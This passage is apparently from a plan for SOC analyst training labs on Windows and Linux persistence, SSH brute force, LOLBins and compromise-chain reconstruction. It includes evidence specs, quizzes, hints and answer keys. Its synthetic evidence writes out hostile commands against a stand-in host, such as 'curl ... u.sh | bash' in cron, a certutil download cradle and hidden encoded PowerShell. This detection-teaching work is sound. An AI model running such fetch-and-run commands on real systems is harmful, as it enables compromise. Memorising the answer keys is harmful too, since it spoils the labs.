    service; q4 cron; q5 hxxp://cdn.stonewick[.]example/u.sh; q6 cm-0311-0181."
  - `recap.md` (3 lines): `Persistence lives in a few known homes: Run keys (Sysmon 13 / 4657),
    scheduled tasks (4698), services (4697/7045), and cron on Linux.` / `Match the artifact to the
    mechanism, then read the payload — a Run value or cron line usually names the command that
    re-launches the attacker.` / `The same C2 you saw beacon is often re-fetched by persistence — the
    WEB01 cron pulls u.sh every 10 minutes, defanged as hxxp://cdn.stonewick[.]example/u.sh.`
  - No `recall.json`.

**EVIDENCE SPEC**
```yaml
scenario: s3-persistence             # tools/genevidence/s3-persistence.yaml
lab: L3.4
window: {start: 2026-03-11T15:41:00Z, end: 2026-03-12T20:20:00Z}
hosts: {WKS-ACCT-07: 10.20.30.107, DC01: 10.20.10.5, WEB01: 10.20.10.20}
attacker: {payload_url: "http://cdn.stonewick.example/u.sh"}   # RAW in evidence; DEFANGED in key
persistence:
  - {mech: runkey, artifact: "HKCU\\...\\Run\\OneDriveUpd", code: sysmon13, id: CM-0311-0181, malicious: true}
  - {mech: scheduledtask, artifact: "\\...\\UpdateOrchestrator\\OneDriveSync", code: 4698, id: CM-0311-0620, malicious: true}
  - {mech: service, artifact: PSEXESVC, code: 7045, malicious: true}
  - {mech: cron, artifact: "*/10 * * * * curl -s http://cdn.stonewick.example/u.sh | bash", id: CM-0312-0457, malicious: true}
  - {mech: scheduledtask, artifact: "\\Microsoft\\Windows\\GroupPolicy\\...", code: 4698, malicious: false}
  - {mech: service, artifact: wuauserv, code: 7045, malicious: false}
emit: {win_json: files/windows-persistence.json, cron_log: files/web01-cron.log, crontab: files/root-crontab.txt,
       legend: files/persistence-legend.md, answers_template: files/answers.template.txt}
answer_key:
  q1: runkey
  q2: scheduledtask
  q3: service
  q4: cron
  q5: hxxp://cdn.stonewick[.]example/u.sh    # DEFANGED
  q6: cm-0311-0181
verify: [evidence crontab shows raw http:// (not defanged); key q5 is the defanged form; all ids present]
```

---

### L3.5 — Linux auth and audit logs — SSH brute force, sudo abuse, new users

| id | title | type | gate | est_minutes |
|---|---|---|---|---|
| L3.5 | Linux auth and audit logs — SSH brute force, sudo abuse, new users | HUNT | false | 20 |

Dir `tracks/soc/phases/p3/L3.5-linux-auth/`. **One concept:** the Linux auth classics — SSH brute
force (many Failed, then Accepted from one source), sudo abuse, and new-user creation — read from
`auth.log`/auditd. Find the compromise on WEB01.

**TEACHING ARTIFACT**
- **Files staged** (`files/`; generated `s3-linux-auth`, RAW):
  - `auth.log` — WEB01 syslog, ~40 lines over `2026-03-12T20:10 … 20:20Z`:
    - **brute force:** ~25 `Failed password for [invalid user] {root,admin,oracle,…} from 203.0.113.66`.
    - **success:** `Accepted password for root from 203.0.113.66` (`CM-0312-0455`) + `session opened
      for user root`.
    - **new user:** `useradd[..]: new user: name=websvc, UID=0, …` (`CM-0312-0630`) — UID 0 is the tell.
    - **sudo:** `websvc : ... COMMAND=/usr/bin/curl http://cdn.stonewick.example/u.sh`.
    - **benign controls:** `Accepted publickey for d.okafor from 10.20.31.112`; `t.aoki` sudo to run
      `apt-get` under a change window.
  - `auditd.log` — a few `execve`/`USER_ACCT` records corroborating the useradd + curl (optional read).
  - `answers.template.txt`.
- **Learner task:** hunt the brute force → success → new user → action chain. Template + grammar:
  ```
  q1=   # source IP of the SSH brute force — DEFANGED                            -> 203.0.113[.]66
  q2=   # count of Failed password lines from that IP                            -> <generator int>
  q3=   # the account the attacker successfully logged in as                     -> root
  q4=   # the new user created during the session                                -> websvc
  q5=   # the UID of that new user (integer) — the tell it's an admin backdoor    -> 0
  q6=   # the payload URL websvc's sudo curl fetched — DEFANGED                    -> hxxp://cdn.stonewick[.]example/u.sh
  ```
- **Grading** (`check.sh`, §2.1): presence + normalize; anchored checks; **q1/q6 defanged**
  (regex-escape); **q2 generator-emitted failed-count** (`verify.py` asserts == emitted count);
  `ck_summary` last.
- **Kit files:**
  - `meta.json`: `{id:"L3.5", type:"HUNT", objective:"Find an SSH brute-force-to-compromise chain in
    auth.log — failures, success, new UID-0 user, malicious sudo — and separate it from benign logins",
    gate:false, est_minutes:20}`
  - `quiz.json`:
    1. (choice) "Twenty `Failed password` then one `Accepted password` for root, all from one IP,
       means:" a) a typo b) a brute force that succeeded — treat root as compromised c) normal admin d)
       a scan → **b**
    2. (choice) "A new user with `UID=0` is dangerous because:" a) UID 0 is root — it's a hidden admin
       account, not an ordinary user b) it can't log in c) UIDs don't matter d) it's a service → **a**
    3. (choice) "`Accepted publickey for d.okafor from 10.20.31.112` next to the brute force is:" a)
       also an attack b) a benign key-based login from an internal host — the control that proves you're
       reading source and method, not just 'Accepted' c) suspicious d) a sudo event → **b**
  - `hints.json`: L1 "Group by source IP and outcome: `grep 'Failed password' auth.log | ...`. One
    external IP dominates the failures and then appears on an Accepted line." L2 "After the success,
    look for `useradd`/`new user` and `sudo ... COMMAND=` in the same session. UID=0 is the backdoor
    tell. Your IP and URL answers must be defanged." L3 "q1 203.0.113[.]66; q2 count the Failed lines
    from it; q3 root; q4 websvc; q5 0; q6 hxxp://cdn.stonewick[.]example/u.sh."
  - `recap.md` (3 lines): `The Linux auth story reads in order: many Failed password from one source, an
    Accepted from that same source, then what the session did.` / `A new user with UID 0 is a root
    backdoor, and a sudo COMMAND line names the attacker's next action.` / `Read source and method, not
    just the word Accepted — a publickey login from an internal host is the benign control beside the
    brute force.`
  - No `recall.json`.
  - **`## SECURITY ONION (OPTIONAL)`**: "The same auth.log ingests into `cardinal-so`; the Hunt UI's
    Linux/auth dashboards pivot on source IP and user. Flat-file `grep`/`awk` is the graded path."

**EVIDENCE SPEC**
```yaml
scenario: s3-linux-auth              # tools/genevidence/s3-linux-auth.yaml
lab: L3.5
window: {start: 2026-03-12T20:10:00Z, end: 2026-03-12T20:20:00Z}
hosts: {WEB01: 10.20.10.20}
externals: {c2: 203.0.113.66}
attacker: {payload_url: "http://cdn.stonewick.example/u.sh"}
attacker_actions:
  - {kind: ssh_bruteforce, src: 203.0.113.66, failed_count: <N>, users: [root, admin, oracle, ...]}
  - {kind: ssh_success, user: root, src: 203.0.113.66, id: CM-0312-0455, t: 2026-03-12T20:15:33Z}
  - {kind: useradd, user: websvc, uid: 0, id: CM-0312-0630, t: 2026-03-12T20:17:00Z}
  - {kind: sudo, user: websvc, command: "/usr/bin/curl http://cdn.stonewick.example/u.sh"}
benign_background:
  - {kind: ssh_publickey, user: d.okafor, src: 10.20.31.112}
  - {kind: sudo, user: t.aoki, command: "/usr/bin/apt-get update", change_window: true}
emit: {authlog: files/auth.log, auditd: files/auditd.log, answers_template: files/answers.template.txt}
answer_key:
  q1: 203.0.113[.]66                 # DEFANGED
  q2: "<failed_count>"               # generator int; verify.py asserts == emitted
  q3: root
  q4: websvc
  q5: "0"
  q6: hxxp://cdn.stonewick[.]example/u.sh   # DEFANGED
verify: [q2 == emitted Failed-line count from 203.0.113.66; benign publickey login present; useradd UID=0]
```

---

### L3.6 — LOLBins — when the attack is a legitimate tool (encoded PowerShell, certutil, `curl | bash` from the other side)

| id | title | type | gate | est_minutes |
|---|---|---|---|---|
| L3.6 | LOLBins — when the attack is a legitimate tool (encoded PowerShell, certutil, `curl \| bash` from the other side) | DECODE | false | 15 |

Dir `tracks/soc/phases/p3/L3.6-lolbins/`. **One concept:** the attack IS a trusted built-in tool —
classify each command line as **abuse vs benign** and name the LOLBin. Closes the Bash-track loop (D3).

**TEACHING ARTIFACT**
- **Files staged** (`files/`; generated `s3-lolbins`, RAW):
  - `commands.jsonl` — 8 rows, each a process-exec record (Windows 4688 / Sysmon 1, or Linux auditd
    execve) with `event.id, host, user, command_line, parent`:
    - **abuse:** `powershell.exe -nop -w hidden -enc <b64>` (M2, `CM-0311-0201`);
      `certutil.exe -urlcache -split -f http://cdn.stonewick.example/a.txt a.txt` (download cradle);
      Linux `curl -s http://cdn.stonewick.example/u.sh | bash` (WEB01, `CM-0312-0457`-adjacent);
      `mshta.exe hxxp-style javascript:...` (rendered raw in evidence as `http://...`).
    - **benign controls (same binaries):** `powershell.exe -File C:\Scripts\Inventory.ps1` (signed
      admin task); `certutil.exe -verify -urlfetch cert.cer` (legit cert check); `curl -s
      https://updates.example/patch.json -o patch.json` (patch fetch); `cmd.exe /c dir` (nothing).
  - `lolbin-legend.md` — static: common LOLBins (powershell, certutil, mshta, rundll32, regsvr32,
    bitsadmin, curl/wget) + the abuse tell for each, and the note that classification is *behavior*,
    not *binary*.
  - `answers.template.txt`.
- **Learner task:** classify each command line; name the LOLBins. Template + grammar:
  ```
  # q1-q4: is this command LOLBin ABUSE? y or n
  # q1=<enc powershell>  q2=<certutil download>  q3=<curl|bash>  q4=<powershell -File signed script>
  q1=            # y|n     -> y
  q2=            # y|n     -> y
  q3=            # y|n     -> y
  q4=            # y|n     -> n
  q5=            # the LOLBin used to DOWNLOAD a file via urlcache (binary name) -> certutil.exe
  q6=            # ATT&CK technique id for the encoded-powershell abuse           -> t1059.001
  ```
- **Grading** (`check.sh`, §2.1): presence + normalize (sed strips the inline `# y|n` grammar comments
  per L1.4 precedent); anchored checks; `ck_summary` last.
- **Kit files:**
  - `meta.json`: `{id:"L3.6", type:"DECODE", objective:"Classify command lines as LOLBin abuse vs
    benign use of the same trusted binaries, and name the technique — the victim-telemetry view of the
    curl|bash installer audited in Bash P4", gate:false, est_minutes:15}`
  - `quiz.json`:
    1. (choice) "What makes a binary a LOLBin?" a) it's malware b) it's a legitimate, often signed,
       system tool that an attacker repurposes (living off the land) c) it's from the internet d) it's
       old → **b**
    2. (choice) "`certutil -urlcache -split -f http://…` is abuse because:" a) certutil is banned b)
       certutil is a certificate tool being used to download a file — off-label c) it uses http d) it's
       slow → **b**
    3. (choice) "The `curl http://…/u.sh | bash` you audited in the Bash track shows up here as:" a) a
       different attack b) the same attack in victim telemetry — auth.log/auditd execve — both sides of
       the glass c) unrelated d) a false positive → **b**
  - `hints.json`: L1 "For each command ask: is this binary doing its normal job, or something
    off-label? The legend lists each LOLBin's abuse tell." L2 "-enc/hidden powershell, certutil
    downloading, and curl|bash are abuse; a signed `-File` script and a real cert `-verify` are benign.
    Same binaries, different behavior." L3 "q1 y; q2 y; q3 y; q4 n; q5 certutil.exe; q6 t1059.001."
  - `recap.md` (3 lines): `LOLBins are the attack hiding as a trusted tool: powershell, certutil, mshta,
    rundll32, curl — all legitimate, all abusable.` / `Classify by behavior, not binary: -enc hidden
    powershell and certutil downloading are abuse; the same binaries do benign work every day.` / `The
    curl|bash installer you audited in Bash P4 is this same attack seen from the victim's endpoint — one
    technique, both sides of the glass.`
  - No `recall.json`.

**EVIDENCE SPEC**
```yaml
scenario: s3-lolbins                 # tools/genevidence/s3-lolbins.yaml
lab: L3.6
window: {start: 2026-03-11T15:41:00Z, end: 2026-03-12T20:20:00Z}
hosts: {WKS-ACCT-07: 10.20.30.107, WEB01: 10.20.10.20, WKS-HD-03: 10.20.30.103}
attacker: {payload_host: cdn.stonewick.example}
commands:
  - {abuse: true,  cmd: "powershell.exe -nop -w hidden -enc <b64>", tech: t1059.001, id: CM-0311-0201}
  - {abuse: true,  cmd: "certutil.exe -urlcache -split -f http://cdn.stonewick.example/a.txt a.txt", tech: t1105, id: CM-0311-0650}
  - {abuse: true,  cmd: "curl -s http://cdn.stonewick.example/u.sh | bash", tech: t1059.004, id: CM-0312-0651}
  - {abuse: false, cmd: "powershell.exe -File C:\\Scripts\\Inventory.ps1", tech: null}
  - {abuse: false, cmd: "certutil.exe -verify -urlfetch cert.cer", tech: null}
  - {abuse: false, cmd: "curl -s https://updates.example/patch.json -o patch.json", tech: null}
emit: {commands_jsonl: files/commands.jsonl, legend: files/lolbin-legend.md, answers_template: files/answers.template.txt}
answer_key: {q1: y, q2: y, q3: y, q4: n, q5: certutil.exe, q6: t1059.001}
verify: [each abused binary has a benign twin in the file; raw commands carry http:// (not defanged)]
```

---

### L3.7 — Phase gate: endpoint log bundle — find the full compromise chain

| id | title | type | gate | est_minutes |
|---|---|---|---|---|
| L3.7 | Phase gate: endpoint log bundle — find the full compromise chain | HUNT | true | 20 |

Dir `tracks/soc/phases/p3/L3.7-gate-compromise-chain/`. **Integrative:** Windows Security + Sysmon +
Linux auth in one bundle; reconstruct the full chain — initial access → execution → persistence →
lateral movement → the Linux foothold. Every Phase 3 skill exercised.

**TEACHING ARTIFACT**
- **Files staged** (`files/`; generated `s3-gate-chain`, RAW; ProcessGuid + cross-host consistent):
  - `windows/security.json` — 4625 spray + 4624 type-3 success `CM-0311-0142`; 4720/4732 rogue admin
    `CM-0311-0244`/`0245`; CHG-2143 PsExec `CM-0310-0019` (benign contrast).
  - `windows/sysmon.json` — the M2 tree (`CM-0311-0610`→`0201`→`0611`), Sysmon-13 Run key `CM-0311-0181`,
    Sysmon-3 beacon `CM-0311-0179`.
  - `linux/auth.log` — WEB01 root brute-force success `CM-0312-0455`, `websvc` UID-0 useradd
    `CM-0312-0630`, crontab REPLACE `CM-0312-0457`.
  - `answers.template.txt` — 8-field chain reconstruction.
- **Learner task:** reconstruct the chain across all three logs. Template + grammar:
  ```
  # Reconstruct the endpoint compromise chain. IOCs DEFANGED; ids lowercase.
  q1=   # the user whose credential the spray compromised                        -> m.reyes
  q2=   # event.id of the successful spray logon (initial access)                -> cm-0311-0142
  q3=   # the interpreter WINWORD.EXE spawned (execution)                         -> powershell.exe
  q4=   # the persistence mechanism on WKS-ACCT-07 (runkey|scheduledtask|service|cron) -> runkey
  q5=   # the rogue local admin account created on FS01                           -> supportadmin
  q6=   # the account the attacker brute-forced on WEB01 (Linux foothold)         -> root
  q7=   # the C2 IP the endpoint beaconed to — DEFANGED                            -> 203.0.113[.]66
  q8=   # event.id of the rogue-admin creation (4720)                             -> cm-0311-0244
  ```
- **Grading** (`check.sh`, §2.1, 8 anchored checks): presence + normalize; **q7 defanged**
  (regex-escape); q4 vocab token; `ck_summary` last; quiz gates 3/3. `verify.py`: all cited ids present
  across the three logs; ProcessGuid tree resolves.
- **Kit files:**
  - `meta.json`: `{id:"L3.7", type:"HUNT", objective:"Reconstruct a full endpoint compromise chain —
    initial access, execution, persistence, lateral movement, Linux foothold — from Windows Security,
    Sysmon, and Linux auth logs together", gate:true, est_minutes:20}`
  - `quiz.json` (3, choice, gates 3/3):
    1. "The chain crosses Windows and Linux hosts. How do you keep it straight?" a) ignore Linux b)
       build a per-host timeline, then link them by shared indicators (the same C2, the same payload
       host) c) assume they're unrelated d) only read Sysmon → **b**
    2. "CHG-2143's PsExec logon sits in the same bundle as the compromise. Why is it NOT part of the
       chain?" a) it is b) it's authorized admin activity under a change ticket — a benign control you
       must not mistake for lateral movement c) PsExec is always benign d) it's on Linux → **b**
    3. "You've reconstructed the chain. The rogue admin on FS01 and the root foothold on WEB01 both
       matter because:" a) they're the same host b) each is a separate persistence/access foothold the
       responder must contain — scope is more than one host c) only FS01 matters d) neither → **b**
  - `hints.json`: L1 "Build three timelines — WKS-ACCT-07 (Windows), FS01 (Windows), WEB01 (Linux) —
    then connect them by the shared C2 and payload indicators." L2 "Initial access = the 4624 type-3
    spray success; execution = WINWORD→powershell; persistence = the Run key; lateral/rogue admin =
    4720/4732 on FS01; Linux foothold = the root brute-force + websvc useradd. CHG-2143 is a benign
    decoy." L3 "q1 m.reyes; q2 cm-0311-0142; q3 powershell.exe; q4 runkey; q5 supportadmin; q6 root; q7
    203.0.113[.]66; q8 cm-0311-0244."
  - `recap.md` (3 lines): `A full compromise chain reads across sensors: Windows Security for the logon,
    Sysmon for the execution tree, Linux auth for the foothold — each grounded in a CM- id.` / `Separate
    authorized activity (CHG-2143 PsExec) from the attack, or you'll escalate a benign change as lateral
    movement.` / `Phase 3 complete: you read Windows event codes cold, walk Sysmon trees, spot the wrong
    child, find persistence, hunt Linux auth, and call a LOLBin — Phase 4 puts a mixed queue in front of
    you.`
  - **`recall.json`: none** (not a phase opener). **Parked draft for L4.1** (drafted now per Phase
    Builder step 6; **[VERIFY-AT-BUILD]** against built Phase 3):
    1. (text) "Windows Security event.code for a successful logon?" → **key `4624`** — source **L3.1**.
    2. (text) "Which Sysmon field joins a child process to its parent? (field name)" → **key
       `parentprocessguid`** (accept `processguid`) — source **L3.2**.
    3. (choice) "Office spawning powershell is an example of anomalous ___." a) process ancestry b) a
       logon type c) a service → **key a** — source **L3.3**.
    4. (text) "Many SSH `Failed password` then one `Accepted` from one IP is a ___ that succeeded (one
       word)." → **key `brute-force`** (accept `bruteforce`, `brute force`) — source **L3.5**.
    5. (text) "A trusted built-in tool used to attack (certutil, `powershell -enc`) is called a ___ (one
       word)." → **key `lolbin`** — source **L3.6**.
  - **`## SECURITY ONION (OPTIONAL)`**: "Load the three logs into `cardinal-so` and reconstruct the
    chain in the Hunt UI (process, auth, and correlation views). The flat-file answers above are the
    graded gate; the VM is never required."

**EVIDENCE SPEC**
```yaml
scenario: s3-gate-chain              # tools/genevidence/s3-gate-chain.yaml
lab: L3.7
window: {start: 2026-03-10T09:00:00Z, end: 2026-03-12T20:20:00Z}
hosts: {DC01: 10.20.10.5, FS01: 10.20.10.8, WKS-ACCT-07: 10.20.30.107, WEB01: 10.20.10.20}
actors: [m.reyes, t.aoki, supportadmin, root, websvc]
externals: {c2: 203.0.113.66, payload: 198.51.100.23}
chain:
  - {stage: initial-access, code: 4624/type3, user: m.reyes, host: DC01, id: CM-0311-0142}
  - {stage: execution, tree: "WINWORD.EXE->powershell.exe->cmd.exe", host: WKS-ACCT-07, id: CM-0311-0201}
  - {stage: persistence, mech: runkey, host: WKS-ACCT-07, id: CM-0311-0181}
  - {stage: c2, code: sysmon3, dst: 203.0.113.66:443, host: WKS-ACCT-07, id: CM-0311-0179}
  - {stage: lateral/rogue-admin, codes: [4720, 4732], user: supportadmin, host: FS01, id: [CM-0311-0244, CM-0311-0245]}
  - {stage: linux-foothold, kind: ssh-bruteforce-success, user: root, host: WEB01, id: CM-0312-0455}
  - {stage: linux-persistence, kind: useradd+cron, user: websvc, host: WEB01, id: [CM-0312-0630, CM-0312-0457]}
benign_controls:
  - {code: 4624/type3, user: t.aoki, host: DC01, id: CM-0310-0019, note: CHG-2143 authorized PsExec}
emit:
  win_security: files/windows/security.json
  win_sysmon: files/windows/sysmon.json
  linux_auth: files/linux/auth.log
  answers_template: files/answers.template.txt
  key_block: check.sh
answer_key:
  q1: m.reyes
  q2: cm-0311-0142
  q3: powershell.exe
  q4: runkey
  q5: supportadmin
  q6: root
  q7: 203.0.113[.]66                 # DEFANGED
  q8: cm-0311-0244
verify: [all chain ids present across the 3 logs; ProcessGuid tree resolves; CHG-2143 present as benign control]
```

---

## 5. Build order (one session, Phase Builder protocol)

Prerequisite: `soc-p0`/`soc-p1`/`soc-p2` tagged (generator core + Phase 2 emitters on disk).

1. **Generator extensions** — add `win_secevent`, `sysmon_tree`, `linux_authlog`, `win_persistence`
   emitters + the ProcessGuid-consistency `verify.py` invariant; self-test on a throwaway scenario;
   append the §2.1 id table + ProcessGuid seeds to `tools/genevidence/universe-events.yaml`.
2. **p3 scenarios** in map order — `s3-windows-events`, `s3-sysmon-trees`, `s3-wrong-child`,
   `s3-persistence`, `s3-linux-auth`, `s3-lolbins`, `s3-gate-chain` → L3.1…L3.7. Build lab by lab with
   the §2.1 canonical grading pattern; self-test each (fail path + pass path, real outputs pasted);
   commit per lab (`soc L3.x: <title>`), one branch+PR+merge per lab per the standing git-workflow loop.
3. **Gate (L3.7)** integrates the phase and drafts L4.1's recall (parked above); time L3.3/L3.5/L3.7
   against the 20-min ceiling and trim guided steps if tight (HUNT labs are the pacing risk).
4. **Close-out:** `verify.py` green across all `s3-*` (incl. ProcessGuid consistency); `tools/
   lint-labs.sh` + `tools/shellcheck-all.sh` + `tests/acceptance.sh` green (extend `acceptance.sh` with
   a P3 section — 7 labs, fabricated pass + negative case each — and fix catalog-count denominators as
   prior close-outs did); `lab status`/`resume` render p3; update `planned_execution.md`; tag `soc-p3`.
   **Per the multi-phase execution rule, gate at each lab — do not chain all 7 in one unattended pass.**

## 6. Acceptance checklist mapping (PROMPTS.md §174–181)

- **Lab count/titles/types match the map** — §4 entries are map-exact (7 labs, L3.7 gate; DECODE/HUNT).
- **Every lab self-tested, real outputs pasted** — build-order step 2, per lab.
- **shellcheck clean** — every check.sh follows §2.1 + the soc-p2 §2 regex-escape one-liner for
  defanged IOCs; no `disable=`.
- **Gate lab integrative + next-opener recall drafted** — L3.7 (+ parked L4.1 recall, [VERIFY-AT-BUILD]).
- **Evidence generated + consistency-verified** — §2 generator extensions + `verify.py` (in-window,
  entity resolution, key-id presence, no-defang-in-raw, no-fang-in-prose, ProcessGuid consistency,
  emitted-count equality for HUNT counts).
- **`lab status` renders phase; `resume` works mid-phase** — close-out step.
- **Defang discipline** — raw Windows/Sysmon/auth evidence never defanged; prose + keys + learner IOC
  submissions defanged, graded with the §2 regex-escape recipe (D5).
- **Flat-file first / SO overlay** — all 7 labs grade against `files/`; SO is an ungraded appendix on
  L3.5 (optional) and L3.7 only (D4).

---

## Session control (PLAN-AHEAD, all remaining soc phases)

This is Phase 3 of a plan-ahead pass covering every unbuilt soc phase (2 → 3 → 4 → 5 → 6 → 7), one at a
time. **Phase 2 is planned and committed** (`docs/plans/soc-p2-plan.md`, PR #254, merged to `main`).
Nothing is built yet. **After this plan is approved and saved to `docs/plans/soc-p3-plan.md` and
committed (branch → PR → merge, only that file), I STOP and wait for explicit go-ahead before planning
Phase 4 (Triage Craft & the Queue).** Plans only, one file per phase under `docs/plans/soc-p<N>-plan.md`;
no building, no tags, no `planned_execution.md` edits this session.

> **Note for the operator:** other track sessions (rust, ps) are committing plan files in this same
> working tree concurrently — during the Phase 2 commit the local branch/untracked-file state shifted
> mid-sequence. My commits stage only the single soc plan file, so they stay isolated, but be aware the
> shared working directory has multiple writers.
